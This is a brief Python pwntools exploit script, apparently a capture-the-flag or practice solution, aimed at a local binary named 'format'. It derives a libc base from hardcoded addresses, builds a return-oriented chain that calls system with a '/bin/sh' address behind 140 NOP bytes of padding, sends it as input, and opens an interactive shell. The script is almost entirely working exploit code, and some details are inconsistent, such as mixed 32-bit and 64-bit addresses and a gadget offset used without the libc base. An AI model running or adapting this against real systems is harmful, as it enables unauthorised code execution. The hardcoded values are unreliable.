#! /usr/bin/env python
import pwn 
from pprint import pprint
gdb_puts=0xf7e49460
gdb_system=0xf7e1ee10
bin_bash_addr=0x555555755010
printf_address=0xf7e32c60
system_addr=0x7ffff7a31550
offset_libc=gdb_puts-gdb_system
elf=pwn.ELF('./format')
libc=pwn.ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc.address=printf_address-libc.symbols["printf"]
print(libc.address)
p=elf.process()
print p.recvuntil("Name: ")
print("libc.address {}".format(hex(libc.address)))
pop_rdi_ret=pwn.p64(0x00000000000215bf)
# bin_sh= libc.search("/bin/sh").next()
rop_chain=pop_rdi_ret+pwn.p64(bin_bash_addr)+pwn.p64(system_addr)
payload="\x90"*140+rop_chain
p.send("Youness")
p.recvuntil("Code: ")
p.send(payload)
p.interactive()
